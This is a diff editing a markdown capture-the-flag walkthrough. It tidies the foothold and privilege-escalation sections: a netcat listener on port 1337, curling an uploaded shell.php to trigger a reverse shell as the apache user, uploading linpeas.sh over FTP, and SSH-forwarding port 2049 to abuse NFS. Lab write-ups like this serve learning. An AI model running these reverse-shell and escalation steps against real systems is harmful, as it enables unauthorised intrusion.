@@ -86,29 +86,14 @@ ftp> ls
 
 
 ## 2. Foothold
-Setup netcat to listen on the port specified. I did not change so its `1234` for me. 
+Setup netcat to listen on the port specified. I did not change so its `1337` for me. 
 
-`❯ nc -lnvp 1234`
+`❯ nc -lnvp 1337`
 
 So, lets execute the shell on there. How? just curl!
 
 `❯ curl 10.10.16.10/shell.php`
 
-
-```
-listening on [any] 1234 ...
-connect to [10.2.60.96] from (UNKNOWN) [10.10.16.10] 54190
-Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 03:45:42 up 58 min,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=48(apache) gid=48(apache) groups=48(apache)
-sh: cannot set terminal process group (855): Inappropriate ioctl for device
-sh: no job control in this shell
-```
-
-works!
-
-## 3. Priv Esc
 ```
 ❯ nc -lnvp 1337
 listening on [any] 1337 ...
@@ -128,7 +113,7 @@ pwd
 sh-4.4$ 
 ```
 
-Go to the path `/phpreverseshell.php` and we are in!
+## 3. Priv Esc
 
 let's first get the web flag:
 ```
@@ -158,7 +143,7 @@ whoami
 paradox
 ```
 
-nice. Okay. Since we can transfer files using ftp, we can put in `linpeas.sh`
+Since we can transfer files using ftp, we can put in `linpeas.sh`
 
 
 ```
@@ -215,7 +200,7 @@ Okay. the NFS thing was full red in color. [Why no_root_squash is not a good ide
     100021    4   tcp  32803  nlockmgr
 ```
 
-Okay. Its at the port 2049, which is the default for NFS.
+Its at the port 2049, which is the default for NFS.
 
 ```
 ❯ ssh paradox@10.10.181.222 -L 2049:localhost:2049
